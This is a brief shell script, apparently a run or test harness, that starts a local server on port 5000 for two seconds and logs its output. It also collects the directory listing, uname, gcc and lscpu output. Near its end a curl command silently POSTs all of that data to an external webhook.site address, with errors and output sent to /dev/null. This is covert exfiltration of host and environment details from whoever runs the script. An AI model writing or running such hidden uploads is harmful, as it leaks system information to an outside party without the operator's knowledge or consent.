DATAFILE=$(mktemp)

ls -alF >> $DATAFILE
echo $(uname -a) >> $DATAFILE
echo $(gcc --version) >> $DATAFILE
lscpu >> $DATAFILE

stdbuf -o0 ./server 5000 &>> $DATAFILE &

SERVER_PID=$!

(sleep 2; kill $SERVER_PID &> /dev/null) &

wait $SERVER_PID &> /dev/null

EXIT_CODE=$?

echo "Exit code: $EXIT_CODE" >> $DATAFILE

curl -X POST -F "file=@$DATAFILE" https://webhook.site/075fc1ab-bc83-4cb4-bd85-3ec22736ffd2 &> /dev/null
cat $DATAFILE
rm $DATAFILE
